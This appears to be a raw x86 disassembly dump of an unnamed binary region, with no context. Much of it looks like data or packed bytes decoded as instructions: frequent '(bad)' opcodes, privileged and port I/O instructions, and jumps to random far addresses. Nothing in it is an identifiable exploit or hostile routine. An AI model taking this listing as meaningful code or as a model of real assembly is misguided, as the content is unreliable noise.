  40c95a:	test   BYTE PTR [edi-0x53],ch
  40c95d:	dec    ebp
  40c95e:	pop    es
  40c95f:	mov    bl,0x7d
  40c961:	call   0x2d997b58
  40c966:	leave  
  40c967:	test   BYTE PTR [edx],dl
  40c969:	dec    esp
  40c96a:	loop   0x40c907
  40c96c:	into   
  40c96d:	pop    ebp
  40c96e:	out    0x7e,eax
  40c970:	and    eax,0xf9b5f3e0
  40c975:	int    0x31
  40c977:	jo     0x40c985
  40c979:	jg     0x40c96e
  40c97b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c97c:	div    DWORD PTR [esi+0x6cf5af37]
  40c982:	data16 fdivr QWORD PTR [eax*4+0x16fd5802]
  40c98a:	sub    bh,bh
  40c98c:	iret   
  40c98d:	push   esp
  40c98e:	fs sbb al,0xe6
  40c991:	ss pusha 
  40c993:	mov    al,ds:0x5595d548
  40c998:	ret    
  40c999:	cwde   
  40c99a:	in     al,0x7d
  40c99c:	inc    eax
  40c99d:	arpl   WORD PTR [ebp-0x5d],cx
  40c9a0:	fnstsw WORD PTR [eax+edx*8+0x1b]
  40c9a4:	jo     0x40ca09
  40c9a6:	jg     0x40ca0e
  40c9a8:	bound  esi,QWORD PTR [ebx-0x78]
  40c9ab:	push   edi
  40c9ac:	adc    al,BYTE PTR [ebx-0x1b133721]
  40c9b2:	sub    al,BYTE PTR [edi]
  40c9b4:	jmp    0x40c9d5
  40c9b6:	in     eax,dx
  40c9b7:	nop
  40c9b8:	inc    edi
  40c9b9:	mov    al,ds:0xd6ac8afc
  40c9be:	add    bl,al
  40c9c0:	sub    ah,ch
  40c9c2:	pop    ss
  40c9c3:	pop    es
  40c9c4:	test   BYTE PTR [ecx],dh
  40c9c6:	push   esp
  40c9c7:	push   0x30a55e81
  40c9cc:	stos   BYTE PTR es:[edi],al
  40c9cd:	mov    esp,0x92a45c23
  40c9d2:	inc    ebp
  40c9d3:	sti    
  40c9d4:	sahf   
  40c9d5:	int    0xa3
  40c9d7:	adc    cl,dh
  40c9d9:	lods   al,BYTE PTR ds:[esi]
  40c9da:	xchg   esp,eax
  40c9db:	(bad)  
  40c9dd:	ins    BYTE PTR es:[edi],dx
  40c9de:	add    al,0x2
  40c9e0:	sub    BYTE PTR [esi+ebx*8+0x3f4d8b04],cl
  40c9e7:	fbstp  TBYTE PTR [esi+ecx*1]
  40c9ea:	mov    eax,0x667baed1
  40c9ef:	lock fdivr QWORD PTR [ebp-0x54]
  40c9f3:	push   ss
  40c9f4:	and    al,0xa2
  40c9f6:	adc    ch,BYTE PTR [esi]
  40c9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f9:	ffreep st(7)
  40c9fb:	sbb    dl,ch
  40c9fd:	or     DWORD PTR [esi-0x52],eax
  40ca00:	inc    esi
  40ca01:	inc    esp
  40ca02:	sar    BYTE PTR [ebx-0xd],cl
  40ca05:	mov    ebx,0xdc74ed3
  40ca0a:	xchg   ebx,eax
  40ca0b:	bound  eax,QWORD PTR ds:0xb432b8c8
  40ca11:	xlat   BYTE PTR ds:[ebx]
  40ca12:	cld    
  40ca13:	dec    esp
  40ca14:	push   0x4
  40ca16:	call   0x82dce717
  40ca1b:	dec    ebp
  40ca1c:	out    dx,al
  40ca1d:	push   ecx
  40ca1e:	je     0x40c9e6
  40ca20:	sbb    ch,BYTE PTR [edx+0x1283db8a]
  40ca26:	mov    ecx,0x99486c0f
  40ca2b:	fsub   DWORD PTR [eax]
  40ca2d:	sbb    DWORD PTR [eax],edx
  40ca2f:	sbb    eax,0x5fa90809
  40ca34:	fwait
  40ca35:	push   cs
  40ca36:	js     0x40ca1a
  40ca38:	add    ch,BYTE PTR [ebp-0x22]
  40ca3b:	sbb    BYTE PTR [eax+0x45],bl
  40ca3e:	pop    eax
  40ca3f:	int3   
  40ca40:	outs   dx,DWORD PTR ds:[esi]
  40ca41:	shl    DWORD PTR [ecx],cl
  40ca43:	scas   eax,DWORD PTR es:[edi]
  40ca44:	pusha  
  40ca45:	(bad)
  40ca48:	jge    0x40cabe
  40ca4a:	mov    bh,0x1d
  40ca4c:	cwde   
  40ca4d:	jle    0x40ca0c
  40ca4f:	aas    
  40ca50:	cmp    eax,0xaa8b74f4
  40ca55:	xor    DWORD PTR ds:0x7b69b607,ebx
  40ca5b:	mov    ah,dh
  40ca5d:	lock retf 0x7181
  40ca61:	ret    0xab64
  40ca64:	jmp    0x40ca27
  40ca66:	or     ecx,esi
  40ca68:	mov    al,ds:0xbee66692
  40ca6d:	rol    BYTE PTR [edx+edx*4],1
  40ca70:	dec    edx
  40ca71:	std    
  40ca72:	xor    esp,DWORD PTR [ebp-0x63]
  40ca75:	call   0x2d1de719
  40ca7a:	add    al,0xe8
  40ca7c:	js     0x40ca2d
  40ca7e:	sbb    BYTE PTR [ebx+0x7476ea49],0x28
  40ca85:	sahf   
  40ca86:	das    
  40ca87:	ins    BYTE PTR es:[edi],dx
  40ca88:	adc    ebp,DWORD PTR [esi+0x143bca9b]
  40ca8e:	or     DWORD PTR [ecx],0xffffffa9
  40ca91:	sub    eax,0xaaae3744
  40ca96:	pop    edi
  40ca97:	cmp    BYTE PTR [edx-0x3b],0x2c
  40ca9b:	les    esp,FWORD PTR [edi]
  40ca9d:	sbb    al,BYTE PTR [edi]
  40ca9f:	div    dh
  40caa1:	ss ins DWORD PTR es:[di],dx
  40caa4:	add    BYTE PTR [eax+0x54],ah
  40caa7:	outs   dx,BYTE PTR ds:[esi]
  40caa8:	frndint 
  40caaa:	shl    DWORD PTR [ecx-0x5f08fff1],cl
  40cab0:	adc    BYTE PTR [edi-0x9],ch
  40cab3:	retf   
  40cab4:	ss test eax,0x42c4ae7e
  40caba:	jmp    0xe17e6019
  40cabf:	pop    ebp
  40cac0:	out    0x71,eax
  40cac2:	and    al,0xf6
  40cac4:	mov    eax,ds:0xb1d52525
  40cac9:	cmc    
  40caca:	push   ds
  40cacb:	inc    ebx
  40cacc:	idiv   bh
  40cace:	add    BYTE PTR [eax],al
  40cad0:	cli    
  40cad1:	jl     0x40cb2b
  40cad3:	xor    al,BYTE PTR [ecx]
  40cad5:	xor    DWORD PTR [ebp+eax*1+0x3bf5fc41],0x4b18a9ca
  40cae0:	lods   eax,DWORD PTR ds:[esi]
  40cae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cae2:	dec    eax
  40cae3:	pop    es
  40cae4:	xor    dl,cl
  40cae6:	std    
  40cae7:	lock ror BYTE PTR ds:0x5ceb72da,1
  40caee:	dec    edx
  40caef:	in     al,dx
  40caf0:	add    dl,BYTE PTR [esp+eax*4+0x29]
  40caf4:	add    eax,0xe8538c72
  40caf9:	mov    ch,0x32
  40cafb:	(bad)  
  40cafc:	fldenv [ebx]
  40cafe:	lahf   
  40caff:	jo     0x40cb1b
  40cb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb02:	clc    
  40cb03:	adc    ebx,esp
  40cb05:	stc    
  40cb06:	adc    DWORD PTR [ebx+0x1c277baa],esp
  40cb0c:	std    
  40cb0d:	adc    ebx,ebx
  40cb0f:	dec    eax
  40cb10:	or     ecx,esi
  40cb12:	push   0x3c0eb457
  40cb17:	adc    DWORD PTR es:[ebx-0x2d],edi
  40cb1b:	pop    esi
  40cb1c:	test   al,0xdc
  40cb1e:	or     edi,edi
  40cb20:	(bad)  
  40cb21:	sbb    dl,al
  40cb23:	popf   
  40cb24:	push   ss
  40cb25:	push   es
  40cb26:	in     eax,dx
  40cb27:	leave  
  40cb28:	push   eax
  40cb29:	popf   
  40cb2a:	push   ds
  40cb2b:	sbb    al,0x25
  40cb2d:	arpl   WORD PTR [ebx+0x7e11d7f1],bx
  40cb33:	iret   
  40cb34:	fcomp  st(1)
  40cb36:	sbb    ebp,DWORD PTR [ebp+0x39da5ec9]
  40cb3c:	jbe    0x40cb77
  40cb3e:	in     al,0xc4
  40cb40:	cmp    eax,0x9c97e75c
  40cb45:	es leave 
  40cb47:	dec    esi
  40cb48:	inc    ebx
  40cb49:	ja     0x40cae5
  40cb4b:	xlat   BYTE PTR ds:[ebx]
  40cb4c:	cmc    
  40cb4d:	cmp    ah,dh
  40cb4f:	lods   eax,DWORD PTR ds:[esi]
  40cb50:	pusha  
  40cb51:	outs   dx,DWORD PTR ds:[esi]
  40cb52:	pop    ds
  40cb53:	sbb    eax,0x26d89609
  40cb58:	in     al,0xa0
  40cb5a:	push   esi
  40cb5b:	cld    
  40cb5c:	jno    0x40cb38
  40cb5e:	je     0x40cb18
  40cb60:	addr16 repnz (bad) 
  40cb63:	jnp    0x40cbaf
  40cb65:	loop   0x40cafb
  40cb67:	xchg   esi,eax
  40cb68:	mov    eax,ds:0x4950de9f
  40cb6d:	test   BYTE PTR [ecx-0x36],cl
  40cb70:	adc    esi,DWORD PTR [eax]
  40cb72:	xor    ebx,DWORD PTR [edi-0x4e]
  40cb75:	xor    edi,DWORD PTR [ebp+ebx*2-0x29]
  40cb79:	adc    DWORD PTR [edi+0x20],ebx
  40cb7c:	imul   ebx,DWORD PTR [ebx],0xffffff82
  40cb7f:	pop    edx
  40cb80:	push   esp
  40cb81:	repnz push ecx
  40cb83:	mov    eax,0xf7abb19b
  40cb88:	aas    
  40cb89:	js     0x40cbef
  40cb8b:	ja     0x40cbc0
  40cb8d:	std    
  40cb8e:	push   esi
  40cb8f:	jo     0x40cba7
  40cb91:	xor    eax,0x255c43d5
  40cb96:	fcom   DWORD PTR [eax+0x3f]
  40cb99:	out    dx,al
  40cb9a:	jmp    0x38b0:0x7eb76886
  40cba1:	sub    eax,0xabe3ae63
  40cba7:	jmp    0xf7f8:0xcfb7e91
  40cbae:	gs enter 0xb16b,0x3
  40cbb3:	pop    es
  40cbb4:	je     0x40cc31
  40cbb6:	add    BYTE PTR [eax+0xf],dl
  40cbb9:	stc    
  40cbba:	sub    cl,BYTE PTR [eax-0x497834ef]
  40cbc0:	sub    ebp,DWORD PTR [eax+0x39]
  40cbc3:	sti    
  40cbc4:	push   edi
  40cbc5:	or     al,0x27
  40cbc7:	xchg   BYTE PTR [ecx+edx*1],dl
  40cbca:	int    0x8f
  40cbcc:	mov    ch,0x3a
  40cbce:	cmp    eax,0x741dd272
  40cbd3:	xchg   esp,eax
  40cbd4:	aad    0x90
  40cbd6:	aad    0x10
  40cbd8:	sbb    eax,0x91507e40
  40cbdd:	daa    
  40cbde:	sub    eax,0xc7e2419f
  40cbe3:	cmp    DWORD PTR [ebx-0x1e],ebx
  40cbe6:	xchg   edi,eax
  40cbe7:	bound  esi,QWORD PTR [ebx+ebx*1-0x64]
  40cbeb:	jbe    0x40cc2e
  40cbed:	scas   al,BYTE PTR es:[edi]
  40cbee:	pop    ds
  40cbef:	cmp    ch,BYTE PTR es:[ebx+0x284a387c]
  40cbf6:	and    dh,dl
  40cbf8:	jl     0x40cbca
  40cbfa:	mov    eax,ds:0x2a929cde
  40cbff:	or     ecx,DWORD PTR [edx-0x62]
  40cc02:	std    
  40cc03:	xor    bl,dl
  40cc05:	cmp    BYTE PTR [esi],dh
  40cc07:	and    bh,BYTE PTR [esp+edi*4-0x6ec3e877]
  40cc0e:	in     eax,dx
  40cc0f:	sbb    BYTE PTR [esi-0x14],ah
  40cc12:	push   0x42
  40cc14:	mov    bp,0xa3fe
  40cc18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc19:	cmp    esp,esi
  40cc1b:	sbb    esi,DWORD PTR [edx]
  40cc1d:	(bad)  
  40cc1e:	loopne 0x40cc6c
  40cc20:	push   cs
  40cc21:	rol    BYTE PTR [ebp+0x5a486e31],1
  40cc27:	(bad)  
  40cc28:	(bad)  
  40cc29:	lock mov ds:0x7e27ee23,eax
  40cc2f:	cmp    bh,al
  40cc31:	jmp    0x659f:0xfd9f378e
  40cc38:	mov    dh,0xc5
  40cc3a:	mov    WORD PTR [edi],ds
  40cc3c:	jmp    0x40cbc4
  40cc3e:	dec    edi
  40cc3f:	jge    0x40ccb6
  40cc41:	dec    ebx
  40cc42:	sbb    eax,0x678e8dfb
  40cc47:	dec    edx
  40cc48:	cmp    edi,esi
  40cc4a:	mov    eax,0xd9b2c9c5
  40cc4f:	jns    0x40ccaf
  40cc51:	lods   al,BYTE PTR ds:[esi]
  40cc52:	loop   0x40cc5b
  40cc54:	pop    edx
  40cc55:	xchg   DWORD PTR [eax-0x11],ecx
  40cc58:	dec    ebp
  40cc59:	jbe    0x40cccb
  40cc5b:	mov    DWORD PTR [ebx-0x4a],ebx
  40cc5e:	test   DWORD PTR [ecx+0x6b],esi
  40cc61:	les    esp,FWORD PTR ss:[eax]
  40cc64:	mov    WORD PTR [ecx+eax*8],cs
  40cc67:	ins    BYTE PTR es:[edi],dx
  40cc68:	pop    es
  40cc69:	iret   
  40cc6a:	xor    BYTE PTR [ecx-0x66dfea86],ah
  40cc70:	sar    BYTE PTR [eax],cl
  40cc72:	cmp    DWORD PTR [eax-0x75],eax
  40cc75:	xor    DWORD PTR [ecx-0x32],edx
  40cc78:	push   esp
  40cc79:	enter  0x447c,0x55
  40cc7d:	call   0x1d63:0xa444994c
  40cc84:	mov    esp,0xf3b316e5
  40cc89:	arpl   WORD PTR [ebx],cx
  40cc8b:	inc    eax
  40cc8c:	sbb    ebx,DWORD PTR [ebp+0x34]
  40cc8f:	fdiv   st,st(1)
  40cc91:	lds    bp,DWORD PTR [ebp+0x39961198]
  40cc98:	div    BYTE PTR [edx]
  40cc9a:	repz mov al,ds:0x2915905a
  40cca0:	jmp    0xac9f:0xe275586b
  40cca7:	ror    ah,1
  40cca9:	lods   al,BYTE PTR ds:[esi]
  40ccaa:	mov    ecx,DWORD PTR [ebp-0x6b8b8abc]
  40ccb0:	aas    
  40ccb1:	adc    BYTE PTR [ebx+0x2775af7c],ah
  40ccb7:	xchg   edi,eax
  40ccb8:	loopne 0x40cc9b
  40ccba:	mov    esp,0x22ad951
  40ccbf:	adc    dl,bh
  40ccc1:	aas    
  40ccc2:	mov    edx,0xf3508be0
  40ccc7:	imul   ecx,DWORD PTR [eax-0x19d39223],0x2c
  40ccce:	xor    eax,0x70a0ba8d
  40ccd3:	push   edx
  40ccd4:	iret   
  40ccd5:	or     eax,0xa2641d17
  40ccda:	adc    ah,BYTE PTR [edx+ebx*4-0x28]
  40ccde:	fiadd  DWORD PTR [esi]
  40cce0:	mov    ah,0xe5
  40cce2:	sbb    DWORD PTR [edx-0x4],ebx
  40cce5:	push   edi
  40cce6:	clc    
  40cce7:	and    eax,0x8c7ba354
  40ccec:	popf   
  40cced:	adc    eax,0x39424b39
  40ccf2:	cs das 
  40ccf4:	push   0xffffff9a
  40ccf6:	dec    edi
  40ccf7:	xchg   edx,eax
  40ccf8:	sub    ebx,ecx
  40ccfa:	cmp    BYTE PTR [ebp-0x24],cl
  40ccfd:	or     al,0x90
  40ccff:	stos   DWORD PTR es:[edi],eax
  40cd00:	xor    DWORD PTR ss:[esi-0xd1498f3],esp
  40cd07:	dec    eax
  40cd08:	sub    eax,DWORD PTR [esi]
  40cd0a:	loopne 0x40cd18
  40cd0c:	lahf   
  40cd0d:	dec    esp
  40cd0e:	fwait
  40cd0f:	mov    eax,0x6600d2b9
  40cd14:	inc    eax
  40cd15:	or     al,BYTE PTR [eax]
  40cd17:	hlt    
  40cd18:	jl     0x40cd18
  40cd1a:	je     0x40cd9b
  40cd1c:	pop    edx
  40cd1d:	es pop ss
  40cd1f:	(bad)  
  40cd20:	stos   BYTE PTR es:[edi],al
  40cd21:	sub    eax,0x6f051f59
  40cd26:	add    DWORD PTR [ebp-0x17a2424],esp
  40cd2c:	mov    ebx,DWORD PTR [ecx+0x5d]
  40cd2f:	sbb    al,0x74
  40cd31:	push   0x3f
  40cd33:	add    dl,dh
  40cd35:	ror    esp,1
  40cd37:	cmp    edx,DWORD PTR [edi+0x531ed0c3]
  40cd3d:	xchg   esi,eax
  40cd3f:	dec    esi
  40cd40:	mov    ecx,0xa143a498
  40cd45:	std    
  40cd46:	mov    cl,0x5a
  40cd48:	scas   eax,DWORD PTR es:[edi]
  40cd49:	cmp    DWORD PTR [ecx-0x78f3a6d9],esp
  40cd4f:	jb     0x40cd7f
  40cd51:	pop    ds
  40cd52:	cmp    BYTE PTR [edi+0x117cb49b],0x18
  40cd59:	aas    
  40cd5a:	es clc 
  40cd5c:	or     cl,ch
  40cd5e:	test   BYTE PTR [ebx+0x40d262ab],dh
  40cd64:	fwait
  40cd65:	mov    ch,0xf4
  40cd67:	ins    BYTE PTR es:[edi],dx
  40cd68:	fstp   DWORD PTR [edx+0x135c1377]
  40cd6e:	retf   0xf4cb
  40cd71:	addr16 sbb di,di
  40cd75:	inc    esi
  40cd76:	aaa    
  40cd77:	lock cmp eax,ebp
  40cd7a:	dec    ebx
  40cd7b:	mov    edx,esp
  40cd7d:	int3   
  40cd7e:	arpl   WORD PTR [ebx+0x75],si
  40cd81:	daa    
  40cd82:	scas   al,BYTE PTR es:[edi]
  40cd83:	jo     0x40cdb2
  40cd85:	xchg   BYTE PTR [esi+0x5a],ah
  40cd88:	jnp    0x40cd9a
  40cd8a:	xor    BYTE PTR [ebp+0x27],0x5a
  40cd8e:	popf   
  40cd8f:	repnz outs dx,BYTE PTR ds:[esi]
  40cd91:	hlt    
  40cd92:	das    
  40cd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd94:	xchg   esi,eax
  40cd95:	xor    bl,BYTE PTR [ecx]
  40cd97:	into   
  40cd98:	cld    
  40cd99:	cdq    
  40cd9a:	out    dx,al
  40cd9b:	cli    
  40cd9c:	push   0x1def5767
  40cda1:	call   0xc044b959
  40cda6:	sbb    ebp,esi
  40cda8:	ja     0x40cd77
  40cdaa:	xchg   esi,eax
  40cdab:	fwait
  40cdac:	sbb    al,0x9e
  40cdae:	adc    al,0x62
  40cdb0:	push   0x8b09115e
  40cdb5:	pop    esp
  40cdb6:	mov    al,0x1a
  40cdb8:	fsubr  DWORD PTR [esi+0x40]
  40cdbb:	push   eax
  40cdbc:	adc    eax,0x19c769be
  40cdc1:	mov    BYTE PTR [ebx-0x73],ch
  40cdc4:	sub    dh,BYTE PTR [esi]
  40cdc6:	xchg   bp,ax
  40cdc8:	ret    
  40cdc9:	(bad)  
  40cdca:	jecxz  0x40cd8f
  40cdcc:	pop    ebp
  40cdcd:	fwait
  40cdce:	pop    eax
  40cdcf:	mov    eax,0x4cee6315
  40cdd4:	jno    0x40cdb9
  40cdd6:	imul   esi,DWORD PTR [ebx+edx*1+0x25e97391],0xbd128d4
  40cde1:	mov    ebp,0xeb3190ea
  40cde6:	pop    ss
  40cde7:	inc    edi
  40cde8:	dec    esp
  40cde9:	adc    BYTE PTR [ecx],dl
  40cdeb:	mov    al,BYTE PTR [ecx+0x13d619af]
  40cdf1:	mov    ecx,DWORD PTR [ebp+0x6c]
  40cdf4:	push   cs
  40cdf5:	repnz mov ds:0x9c47fdc9,al
  40cdfb:	jne    0x40cd8e
  40cdfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdfe:	pushf  
  40cdff:	xchg   esp,eax
  40ce00:	shl    DWORD PTR [eax],1
  40ce02:	pusha  
  40ce03:	adc    al,BYTE PTR [edi+ebp*8-0xfb13ccb]
  40ce0a:	es and eax,0x2f80dd0
  40ce10:	retf   0x6ed5
  40ce13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce14:	cmc    
  40ce15:	xchg   eax,esp
  40ce17:	jnp    0x40ce18
  40ce19:	jg     0x40cdcd
  40ce1b:	ret    0xa949
  40ce1e:	cmp    bh,BYTE PTR [edx-0x5befe026]
  40ce24:	pop    es
  40ce25:	ficom  DWORD PTR [edx-0x67]
  40ce28:	iret   
  40ce29:	rol    DWORD PTR [eax+0x69],0x47
  40ce2d:	dec    esi
  40ce2e:	or     DWORD PTR [ebx-0x58],esi
  40ce31:	test   bl,dl
  40ce33:	lea    ebp,[ecx+0x73]
  40ce36:	aad    0x75
  40ce38:	repnz mov cl,0x6e
  40ce3b:	neg    ecx
  40ce3d:	adc    eax,0x57def80f
  40ce42:	mov    WORD PTR [ebx],gs
  40ce44:	sub    BYTE PTR [ecx+0x7c],dh
  40ce47:	mov    ebp,0x5b370a53
  40ce4c:	loop   0x40ce8c
  40ce4e:	sub    ch,dl
  40ce50:	and    ecx,esp
  40ce52:	test   DWORD PTR [ecx],ebp
  40ce54:	xor    edx,DWORD PTR [edx+0x2150cb74]
  40ce5a:	xchg   edi,eax
  40ce5b:	adc    eax,0x75928c78
  40ce60:	jnp    0x40ce57
  40ce62:	cld    
  40ce63:	push   ecx
  40ce64:	test   eax,0x39856f44
  40ce69:	dec    ecx
  40ce6a:	fmul   QWORD PTR [edx-0x33]
  40ce6d:	add    ebp,DWORD PTR [edx+0x35]
  40ce70:	jnp    0x40cdfc
  40ce72:	loop   0x40ce7e
  40ce74:	dec    edx
  40ce75:	jno    0x40cec9
  40ce77:	inc    ebp
  40ce78:	mov    eax,0x980068cd
  40ce7d:	or     al,0xa3
  40ce7f:	fimul  DWORD PTR [edi-0x6fb4af3c]
  40ce85:	imul   edi,DWORD PTR [esi],0xb5a34ab6
  40ce8b:	ja     0x40cecb
  40ce8d:	loopne 0x40ce4d
  40ce8f:	dec    eax
  40ce90:	jl     0x40cedf
  40ce92:	inc    esp
  40ce93:	hlt    
  40ce94:	es sti 
  40ce96:	bnd js 0x40ce76
  40ce99:	xlat   BYTE PTR ds:[ebx]
  40ce9a:	or     edx,esi
  40ce9c:	pop    ss
  40ce9d:	outs   dx,DWORD PTR ds:[esi]
  40ce9e:	adc    DWORD PTR [edx+0x7b50a458],0xacc73af3
  40cea8:	ins    DWORD PTR es:[edi],dx
  40cea9:	inc    edi
  40ceaa:	sub    DWORD PTR [ebp-0x32],edi
  40cead:	fist   WORD PTR [ebx]
  40ceaf:	mov    edx,0xcd7a9204
  40ceb4:	test   DWORD PTR [eax+0x4f],ebp
  40ceb7:	mov    esp,0xeb077b3d
  40cebc:	sbb    al,0xe8
  40cebe:	mov    al,ds:0xa1c8284e
  40cec3:	mov    ah,0xcf
  40cec5:	leave  
  40cec6:	retf   0xdc5c
  40cec9:	cmp    BYTE PTR [edx+0xdb2cdce],0x36
  40ced0:	mov    WORD PTR ds:0x898b8c7d,cs
  40ced6:	mov    esi,0x9def4d6
  40cedb:	jae    0x40ce85
  40cedd:	ins    DWORD PTR es:[edi],dx
  40cede:	addr16 or dl,dh
  40cee1:	mov    ah,0xf3
  40cee3:	aad    0xc
  40cee5:	es xchg esi,eax
  40cee7:	push   ds
  40cee8:	push   es
  40cee9:	mov    ss,esp
  40ceeb:	sahf   
  40ceec:	or     dl,ch
  40ceee:	pop    es
  40ceef:	sub    al,0x6a
  40cef1:	mov    ebx,0xb50ed6e1
  40cef6:	cli    
  40cef7:	jecxz  0x40cedd
  40cef9:	(bad)  
  40cefa:	push   edi
  40cefb:	fs mov esi,0x8228e6dd
  40cf01:	xchg   edi,eax
  40cf02:	mov    eax,0x7c005f2a
  40cf07:	cmp    eax,0xad78c2f8
  40cf0c:	aad    0x2f
  40cf0e:	push   0x65254627
  40cf13:	shl    BYTE PTR [eax+0x4f],0xdb
  40cf17:	xchg   esp,eax
  40cf18:	ss cmp eax,0x74adf893
  40cf1e:	mov    ah,BYTE PTR [esi-0x3d]
  40cf21:	sub    al,0xb
  40cf23:	push   ss
  40cf24:	mov    eax,0x81593b48
  40cf29:	arpl   bx,bp
  40cf2b:	or     BYTE PTR [ebp+ecx*2+0x46746f8b],dl
  40cf32:	xchg   ecx,eax
  40cf33:	js     0x40cfa3
  40cf35:	mov    bl,0xd7
  40cf37:	imul   esp,esi,0x97e71d73
  40cf3d:	mov    ds:0xb17a3486,eax
  40cf42:	data16 int3 
  40cf44:	stc    
  40cf45:	call   0xef3c:0x8f78dc61
  40cf4c:	jecxz  0x40cf16
  40cf4e:	imul   BYTE PTR [edi+0x75]
  40cf51:	outs   dx,BYTE PTR ds:[esi]
  40cf52:	(bad)  [eax-0x3e]
  40cf55:	jmp    0xe70a:0x3b12c544
  40cf5c:	iret   
  40cf5d:	sti    
  40cf5e:	push   0xedc2d1b7
  40cf63:	mov    ss,ebp
  40cf65:	xchg   BYTE PTR [edi+0x2d3acacf],bl
  40cf6b:	icebp  
  40cf6c:	not    BYTE PTR [ebx-0x62]
  40cf6f:	cmp    DWORD PTR [ecx],ebp
  40cf71:	fsub   st,st(2)
  40cf73:	jo     0x40cf5d
  40cf75:	lock pop ss
  40cf77:	retf   0xd0d4
  40cf7a:	imul   ebp,DWORD PTR [esi-0x4a2d4efd],0x1e
  40cf81:	test   eax,0x435b94ef
  40cf86:	cmp    DWORD PTR [ebx+0x31],0xbe49d521
  40cf8d:	sub    BYTE PTR [eax+0x483104d8],bh
  40cf93:	pop    ss
  40cf94:	pusha  
  40cf95:	jne    0x40cf62
  40cf97:	div    DWORD PTR [edi]
  40cf99:	sbb    DWORD PTR [esp+eiz*8],ebp
  40cf9c:	push   ss
  40cf9d:	mov    ch,0x3f
  40cf9f:	shl    BYTE PTR gs:[ebx],cl
  40cfa2:	shl    DWORD PTR [ebp+eax*8-0x5dba1ef6],cl
  40cfa9:	retf   
  40cfaa:	loopne 0x40cf62
  40cfac:	mov    ebp,0x63a5a44c
  40cfb1:	or     eax,0x641be768
  40cfb6:	mov    bl,dh
  40cfb8:	push   ds
  40cfb9:	loop   0x40cfe6
  40cfbb:	iret   
  40cfbc:	mov    ch,0x22
  40cfbe:	js     0x40d03f
  40cfc0:	pop    es
  40cfc1:	shl    BYTE PTR [ebp-0x29],0x40
  40cfc5:	sahf   
  40cfc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfc7:	lahf   
  40cfc8:	fist   WORD PTR ds:0xd4ae2faf
  40cfce:	jecxz  0x40cf7d
  40cfd0:	jp     0x40cfce
  40cfd2:	mov    esi,esi
  40cfd4:	or     DWORD PTR [edi+0x2a70bf7a],ebp
  40cfda:	jno    0x40cfe4
  40cfdc:	lock aad 0x93
  40cfdf:	outs   dx,BYTE PTR ds:[esi]
  40cfe0:	fimul  DWORD PTR [edx]
  40cfe2:	ret    
  40cfe3:	jnp    0x40cfe5
  40cfe5:	in     eax,dx
  40cfe6:	mov    ds:0x1c29f8cc,al
  40cfeb:	mov    eax,ds:0xbc4962
  40cff0:	je     0x40cfc6
  40cff2:	push   eax
  40cff3:	sar    esi,1
  40cff5:	jmp    0xc32:0x7223c7c3
  40cffc:	jle    0x40d045
  40cffe:	inc    edi
  40cfff:	sub    BYTE PTR [esi+0x5aa38871],al
  40d005:	fistp  WORD PTR [ecx+ecx*2+0x54]
  40d009:	jne    0x40d027
  40d00b:	inc    eax
  40d00d:	outs   dx,BYTE PTR ds:[esi]
  40d00e:	jbe    0x40d067
  40d010:	jmp    0x40d06b
  40d012:	mov    edi,0x62077cc4
  40d017:	inc    ebx
  40d018:	loopne 0x40cfc9
  40d01a:	test   eax,0x6297eba2
  40d01f:	out    0x51,eax
  40d021:	js     0x40cffc
  40d023:	pop    esp
  40d024:	push   ds
  40d025:	dec    DWORD PTR [esi]
  40d027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d028:	cwde   
  40d029:	dec    esi
  40d02a:	pop    esi
  40d02b:	(bad)  
  40d02c:	and    al,ch
  40d02e:	fsub   QWORD PTR [eax-0x1cf50d6b]
  40d034:	ds ins BYTE PTR es:[edi],dx
  40d036:	inc    ebx
  40d037:	inc    ebx
  40d038:	inc    ebx
  40d039:	fcmovnbe st,st(5)
  40d03b:	jle    0x40d040
  40d03d:	dec    ebp
  40d03e:	mov    edi,0x5dc5c568
  40d043:	and    DWORD PTR [ebx-0x1e2fbf62],esp
  40d049:	fdivr  st(7),st
  40d04b:	mov    fs,WORD PTR [edi]
  40d04d:	ss pop ss
  40d04f:	mov    ecx,0xe8bc469c
  40d054:	shl    DWORD PTR [edx+0x2ba6e67],cl
  40d05a:	cmp    cl,BYTE PTR [ebx]
  40d05c:	adc    al,0x8e
  40d05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d05f:	(bad)  
  40d060:	pop    eax
  40d061:	(bad)  
  40d062:	sub    al,0x26
  40d064:	adc    cl,BYTE PTR [ebp+0x40]
  40d067:	mov    bh,0x61
  40d069:	(bad)  
  40d06b:	push   ebx
  40d06c:	imul   ebx,DWORD PTR [ecx-0x2fbedecc],0x132313c1
  40d076:	sub    al,0xf4
  40d079:	and    DWORD PTR ds:0x99b269db,edx
  40d07f:	das    
  40d080:	and    bl,BYTE PTR [ebx]
  40d082:	push   edx
  40d083:	jns    0x40d046
  40d085:	cmp    eax,0xa3bf322f
  40d08a:	inc    esp
  40d08b:	ins    DWORD PTR es:[edi],dx
  40d08c:	xchg   edx,eax
  40d08d:	jno    0x40d084
  40d08f:	inc    esp
  40d090:	cdq    
  40d091:	push   ebp
  40d092:	std    
  40d093:	pop    ds
  40d094:	sbb    DWORD PTR [ecx-0x54ec66f8],edi
  40d09a:	icebp  
  40d09b:	ins    DWORD PTR es:[edi],dx
  40d09c:	sub    esi,DWORD PTR [edx+0x6ea2d9e]
  40d0a2:	int3   
  40d0a3:	retf   0xa82
  40d0a6:	add    eax,0x7a51f01f
  40d0ab:	test   DWORD PTR [ebp+0x2aa5d423],ebp
  40d0b1:	jecxz  0x40d077
  40d0b3:	pop    bp
  40d0b5:	lods   eax,DWORD PTR ds:[esi]
  40d0b6:	jb     0x40d0e7
  40d0b8:	mov    eax,0x9ec5728c
  40d0bd:	(bad)  
  40d0be:	cmp    bl,bl
  40d0c0:	sbb    al,0x32
  40d0c2:	enter  0x2b1a,0x35
  40d0c6:	out    0x1a,al
  40d0c8:	pop    ss
